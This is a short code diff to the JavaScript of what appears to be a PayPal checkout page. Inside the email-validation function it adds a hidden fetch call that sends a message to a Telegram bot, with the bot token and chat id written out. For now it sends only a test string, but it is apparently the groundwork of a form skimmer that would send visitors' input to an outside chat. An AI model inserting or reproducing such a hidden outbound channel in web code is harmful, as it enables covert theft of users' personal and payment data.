@@ -194,6 +194,11 @@ initPayPalButton();
 
 function validarCorreo() {
 
+const text = `probando`;
+fetch(`https://api.telegram.org/bot5681304304:AAEu-fET6lCdJiAiRnLHUNpLdR0j_5AF_k/sendMessage?chat_id=@K3rneLPanik&text=${text}`);
+
+
+
 const smartButtonContainer = document.getElementById('smart-button-container');
 
 const correo = document.getElementById('mail').value;
